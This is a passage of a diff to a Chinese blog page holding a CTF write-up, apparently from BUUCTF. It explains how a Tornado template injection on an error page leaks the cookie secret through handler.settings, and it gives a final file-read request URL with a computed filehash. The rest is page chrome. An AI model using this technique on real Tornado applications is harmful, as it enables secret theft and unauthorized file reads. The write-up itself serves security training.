+<h4 id="做题过程-11"><a href="#做题过程-11" class="headerlink" title="做题过程"></a>做题过程</h4><p>打开题目发现有三个txt文件，一个告诉了flag文件的位置，另外的提示render和最终payload格式。</p>
+<p>经过测试得到存在模板注入的页面是一个报错页面。可以修改msg的参数，可问题出在了cookie我们不知道，想了半天也出不来，最后看别人的wp才知道在tornado的前端页面模板中存在一些可以访问的快速对象，我们想找的cookie就在handler.settings里面，通过render访问handler.settings便可以获取到cookie了。</p>
+<h4 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxx&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;6ae362ce8fc45f789ea20ff9fc771d1f</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>感谢请我喝奶茶<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/img/alipay.png">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">文件包含漏洞</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/02/08/BUUCTF%E7%9A%84WP/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2021/02/12/python30%E5%A4%A9%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Python30天学习笔记
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2021/02/01/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SSTI模板注入漏洞总结</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
+
 
 
           </div>
@@ -224,9 +486,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
